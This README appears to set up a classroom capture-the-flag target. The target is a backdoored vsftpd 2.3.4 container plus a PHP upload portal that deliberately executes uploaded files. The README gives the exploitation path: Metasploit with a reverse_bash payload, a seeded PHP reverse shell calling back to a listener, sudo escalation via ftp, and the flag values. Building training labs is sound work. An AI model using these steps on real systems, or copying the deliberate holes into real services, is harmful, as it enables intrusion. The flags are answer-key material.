# vsftpd 2.3.4 CTF target — first stage

**INTENTIONALLY VULNERABLE TRAINING ENVIRONMENT. Use only on a trusted classroom network.**

This is one target container for the Ubuntu VM. The Kali container and per-student isolation in the attached plan are not built here. The CVE-2011-2523 backdoor is adapted for this CTF: it starts a shell as `vyshu` so students can complete a sudo privilege escalation step.

## One isolated target per Kali VM

Each student can run the complete target inside their own Kali VM. The installer detects Kali's `eth0` IPv4 address, installs Docker when needed, builds the target in `/opt/ctf2026-kali-lab`, binds the CTF ports to `eth0`, and configures the seeded PHP reverse shell to call back to that same address.

For students who have SSH access to this private repository, the complete one-line installation is:

```sh
git clone git@github.com:vaishnavucv/ctf2026.git ~/ctf2026 && sudo bash ~/ctf2026/bootstrap-kali.sh --remove-source
```

After the container passes its health check, `--remove-source` deletes the cloned `~/ctf2026` directory. The Docker image and running container remain available, and students scan and attack the `eth0` address printed by the installer.

If you distribute the repository folder or an archive to the student, run this one command from inside it:

```sh
sudo bash bootstrap-kali.sh
```

If the repository is later made public, this HTTPS one-liner also works:

```sh
git clone --depth 1 https://github.com/vaishnavucv/ctf2026.git ~/ctf2026 && sudo bash ~/ctf2026/bootstrap-kali.sh --remove-source
```

The script prints the detected target IP and ready-to-copy Nmap, Gobuster, listener, and Metasploit settings. Since students control root and Docker inside their own VM, this layout provides technical isolation between students but cannot prevent a student from inspecting their own container or image for answers.

## Fresh Ubuntu or EC2 bootstrap

The bootstrap script installs Git and Docker, clones this repository, builds the image, waits for the container to become healthy, and prints the public attack IP and service URLs. This GitHub repository is private, so copy `bootstrap-ec2.sh` to the server first and provide either a GitHub SSH key or a temporary token that can read the repository.

```sh
scp bootstrap-ec2.sh <ubuntu-host>:/tmp/bootstrap-ec2.sh
sudo bash /tmp/bootstrap-ec2.sh
```

For a token-authenticated private clone and optional SSH password user, pass the secrets at runtime. They are not written to the repository or its Git remote:

```sh
read -rsp 'GitHub token: ' GITHUB_TOKEN; echo
sudo env GITHUB_TOKEN="$GITHUB_TOKEN" \
  CTF_SSH_USER='<username>' CTF_SSH_PASSWORD='<password>' \
  bash /tmp/bootstrap-ec2.sh
unset GITHUB_TOKEN
```

For a public EC2 classroom target, its security group must allow inbound TCP `22`, `2222`, `5678`, `6200`, `6379`, and `8080` from the intended student source range. Using `0.0.0.0/0` makes every service internet-accessible. The bootstrap configures UFW when it is already active, but AWS security group rules must be configured in AWS.

## Ports

| Ubuntu VM | Container | Purpose |
| --- | --- | --- |
| TCP 2222 | TCP 2222 | OpenSSH decoy; authentication is disabled without a provisioned key |
| TCP 5678 | TCP 22 | FTP control, banner `vsFTPd 2.3.4` |
| TCP 6200 | TCP 6200 | Backdoor shell, opens after the vulnerable FTP trigger |
| TCP 6379 | TCP 6379 | Redis decoy; limited to non-mutating discovery commands |
| TCP 8080 | TCP 8080 | nginx 1.22.1 cloud platform with an unlinked vulnerable `/freemedia/` PHP upload portal |

Port 22 inside the container is **FTP**, not SSH. TCP 6200 is needed for students to complete the CVE-2011-2523 exercise or use the standard Metasploit module. It is closed until triggered. This lab grants a shell **inside the disposable container** to anyone who reaches it.

Ports 2222, 6379, and 8080 run real OpenSSH, Redis, and nginx services. SSH has no accepted password and no authorized key. Redis permits service discovery such as `PING` and `INFO` but denies data-changing commands. The HTTP landing page does not link to the `/freemedia/` path, which students can discover through directory enumeration. FreeMedia intentionally accepts arbitrary files and executes uploaded PHP as `vyshu5678` for the web exploitation route.

## Run on the Ubuntu VM

Install Docker Engine and the Compose plugin, then copy this entire directory to the VM:

```sh
cp .env.example .env
docker compose up -d --build
docker compose ps
```

With the default `LAB_BIND_IP=0.0.0.0`, students connect to the **Ubuntu VM's private LAN IP**, port 5678. On the VM itself, `127.0.0.1:5678` and `localhost:5678` also work. If you set `LAB_BIND_IP` to only the VM's LAN IP, localhost will no longer work. Never use the VM's public IP for this lab.

The VM's network adapter must be reachable from student devices (usually bridged mode). The VM firewall must allow inbound TCP 5678 and 6200 from the student Wi-Fi subnet. Wi-Fi client isolation or a NAT-only VM network can prevent student access even when Docker is healthy.

## Check

```sh
docker compose ps
nc -vz 127.0.0.1 5678
nmap -Pn -sV -p- <VM_LAN_IP>
```

Expected services are OpenSSH on 2222, vsftpd 2.3.4 on 5678, Redis on 6379, and nginx on 8080. TCP 6200 remains closed until the FTP backdoor is triggered. The internal FTP port is 22, so Nmap identifies host port 5678 through version detection.

From Kali, verify the web service and discover its unlinked directory with:

```sh
nmap -Pn -sV -p 8080 <VM_LAN_IP>
gobuster dir -u http://<VM_LAN_IP>:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Nmap should report `nginx 1.22.1`, and Gobuster should report `/freemedia` with an HTTP redirect to `/freemedia/`.

## FreeMedia PHP route

The hidden portal contains ten locally stored Unsplash images and four sample files. Files uploaded through the multiple-file form are stored in `/var/www/html/freemedia/uploads/` and appear in the media library. Each asset has an **Open** action and a **Download** action. Open executes PHP through PHP-FPM as `vyshu5678`; Download returns the original bytes through `download.php`, including PHP source. There is intentionally no extension or content validation.

The seeded `shell.php` was copied from `/home/kali/shell.php` in the Kali VM and configured for `192.168.56.12:4444`. Start the listener in Kali before opening it:

```sh
nc -lvnp 4444
```

Students using a different Kali address should edit `$ip` in their own copy before uploading it. Once connected, the intended path is:

```sh
id
cat /home/vyshu5678/INS.txt
sudo -l
sudo su
id
cat /root/freemedia/commander.txt
```

`vyshu5678` has passwordless sudo access. The two web-route flag files contain these Base64 values:

```text
/home/vyshu5678/INS.txt: SU5TX0NURntwaHBzaGVsbC1oYWNrZXItbG9sfVVTRVIudHh0
/root/freemedia/commander.txt: SU5TX0NURntob3BldGhpc3dhc3NpbXBsZS1sb2x9Uk9PVC50eHQ=
```

For Metasploit, use `exploit/unix/ftp/vsftpd_234_backdoor`, `RHOSTS=<VM_LAN_IP>`, and `RPORT=5678`. On the tested Kali version (Metasploit 6.4.135-dev), use `PAYLOAD=cmd/unix/reverse_bash` and `LHOST=<KALI_IP>`. Its default x86 payload is unsuitable for this ARM64 Ubuntu VM, and this installed module has only target 0. The module version in newer Kali releases may offer different targets.

The tested VirtualBox host-only path was Ubuntu `192.168.56.13` and Kali `192.168.56.12`. The Ubuntu VM's Wi-Fi address was `172.20.10.4` during the test and may change after reconnecting. Kali successfully ran:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.13
set RPORT 5678
set PAYLOAD cmd/unix/reverse_bash
set LHOST 192.168.56.12
exploit
```

For a second independent check from Kali, run `python3 verify_from_kali.py 192.168.56.13` using the script in `scripts/`. It checks the full path: initial `vyshu` shell, `sudo -l`, `sudo ftp`, FTP's `!/bin/bash`, and both text files. A triggered backdoor may remain open, and this target is shared; recreate it between student exploits. Scans can run concurrently, but shell exercises should run sequentially until per-student instances are added.

The FTP and FreeMedia routes have separate user and root files with different Base64 values:

```text
FTP user:     /home/vyshu/INS.txt
FTP root:     /root/commander.txt
FreeMedia user: /home/vyshu5678/INS.txt
FreeMedia root: /root/freemedia/commander.txt
```

Both root files are mode `0600`, so neither initial unprivileged shell can read its root flag before escalation. Base64 is an encoding, not a cryptographic hash.

To reset the target and close an already triggered backdoor, run:

```sh
docker compose up -d --force-recreate vsftpd-target
```

To stop and remove the target:

```sh
docker compose down
```

This image builds from affected source at Git commit `e084c9543947d9509ea74731adca427418604cc2` of `nikdubois/vsftpd-2.3.4-infected`, vendored in `source/`. The CTF change drops the backdoor shell to `vyshu`. A clean vsftpd 2.3.4 release does not reproduce CVE-2011-2523.
